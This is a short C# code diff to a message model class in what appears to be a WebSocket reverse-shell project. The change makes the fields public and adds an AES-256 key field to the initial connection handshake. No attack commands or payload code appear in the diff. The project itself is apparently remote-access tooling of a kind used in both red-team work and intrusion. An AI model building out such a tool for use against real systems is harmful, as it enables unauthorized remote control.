@@ -9,7 +9,7 @@ namespace WebSocketReverseShellDotNet.model
 {
     internal class InitialConnectionMessageModel
     {
-        private string sessionId;
+        public string sessionId;
 
         public string GetSessionId()
         {
@@ -21,17 +21,23 @@ namespace WebSocketReverseShellDotNet.model
             sessionId = value;
         }
 
-        private string InitialMessage;
+        public string aes256Key;
+
+        public string InitialMessage;
 
 
 
         [JsonConstructor]
         public InitialConnectionMessageModel(
             [JsonProperty("sessionId")] string sessionId,
-            [JsonProperty("initialMessage")] string initialMessage)
+            [JsonProperty("initialMessage")] string initialMessage,
+            [JsonProperty("aes256Key")] string aes256Key
+            
+            )
         {
-            SetSessionId(sessionId);
-            InitialMessage = initialMessage;
+            this.sessionId = sessionId;
+            this.InitialMessage = initialMessage;
+            this.aes256Key = aes256Key;
         }
     }
 }
